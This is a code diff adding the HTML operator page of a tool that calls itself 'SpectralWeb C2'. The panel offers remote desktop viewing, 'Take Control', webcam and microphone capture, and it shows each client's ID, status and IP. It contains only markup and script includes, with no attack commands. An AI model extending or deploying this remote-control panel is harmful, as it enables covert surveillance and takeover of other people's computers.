@@ -1,0 +1,110 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Client Control Panel - SpectralWeb C2</title>
+    <link rel="stylesheet" href="css/client_control.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+</head>
+<body>
+    <div class="sidebar" id="sidebar">
+        <div class="menu-toggle" id="menuToggle">
+            <i class="fas fa-bars"></i>
+        </div>
+        <div class="icons">
+            <div class="icon active" data-function="desktop">
+                <i class="fas fa-desktop"></i>
+                <span class="icon-label">Remote Desktop</span>
+            </div>
+            <div class="icon" data-function="webcam">
+                <i class="fas fa-video"></i>
+                <span class="icon-label">Webcam</span>
+            </div>
+            <div class="icon audio-output" data-function="audio-output">
+                <i class="fas fa-volume-up"></i>
+                <span class="icon-label">Audio Output</span>
+            </div>
+            <div class="icon audio-input" data-function="audio-input">
+                <i class="fas fa-microphone"></i>
+                <span class="icon-label">Audio Input</span>
+            </div>
+        </div>
+    </div>
+
+    <div class="main-content" id="mainContent">
+        <div class="header">
+            <h1 class="title">Client Control Panel</h1>
+            <div class="client-info">
+                <div class="info-item">
+                    <span class="label">Client ID:</span>
+                    <span class="value" id="clientId">Loading...</span>
+                </div>
+                <div class="info-item">
+                    <span class="label">Status:</span>
+                    <span class="value status-online" id="clientStatus">Loading...</span>
+                </div>
+                <div class="info-item">
+                    <span class="label">IP:</span>
+                    <span class="value" id="clientIp">Loading...</span>
+                </div>
+            </div>
+        </div>
+
+        <div class="desktop-container" id="desktopContainer">
+          <div class="desktop-controls">
+            <button class="control-btn observe-off" id="observeBtn">
+              <i class="fas fa-eye"></i> Observation: <span id="observeStatus">OFF</span>
+            </button>
+            <button class="control-btn control-off" id="controlBtn">
+              <i class="fas fa-mouse-pointer"></i> Take Control: <span id="controlStatus">OFF</span>
+            </button>
+          </div>
+
+          <div class="desktop-display">
+            <video id="desktopVideo" class="desktop-feed" autoplay playsinline muted style="display:none"></video>
+            <div class="desktop-placeholder" id="desktopPlaceholder" style="display:block">
+              <h3>Remote Desktop Feed</h3>
+              <p>Waiting for stream...</p>
+            </div>
+          </div>
+        </div>
+
+        <div class="webcam-container" id="webcamContainer" style="display: none;">
+            <div class="webcam-controls">
+                <button class="control-btn webcam-off" id="webcamToggleBtn">
+                    <i class="fas fa-video"></i> Webcam: <span id="webcamStatus">OFF</span>
+                </button>
+            </div>
+
+            <div class="webcam-display">
+                <video id="webcamFeed" class="webcam-feed" autoplay muted style="display:none"></video>
+                <div class="webcam-placeholder" id="webcamPlaceholder" style="display:block">
+                    <h3>Webcam Feed</h3>
+                    <p>Click toggle to start webcam...</p>
+                </div>
+            </div>
+        </div>
+
+        <div class="function-container" id="functionContainer" style="display: none;">
+            <div class="welcome-message">
+                <h2>Select a function from the sidebar</h2>
+                <p>Choose an action from the left menu to control the client</p>
+            </div>
+        </div>
+    </div>
+
+    <!-- Подключение всех JS файлов в правильном порядке -->
+    <script src="js/client_control_modules/data/client_info.js"></script>
+    <script src="js/client_control_modules/data/states.js"></script>
+    <script src="js/client_control_modules/commands/sender.js"></script>
+    <script src="js/client_control_modules/streams/desktop.js"></script>
+    <script src="js/client_control_modules/streams/webcam.js"></script>
+    <script src="js/client_control_modules/audio/output.js"></script>
+    <script src="js/client_control_modules/audio/input.js"></script>
+    <script src="js/client_control_modules/ui/views.js"></script>
+    <script src="js/client_control_modules/ui/buttons.js"></script>
+    <script src="js/client_control_modules/ui/sidebar.js"></script>
+    <script src="js/client_control.js"></script>
+</body>
+</html>
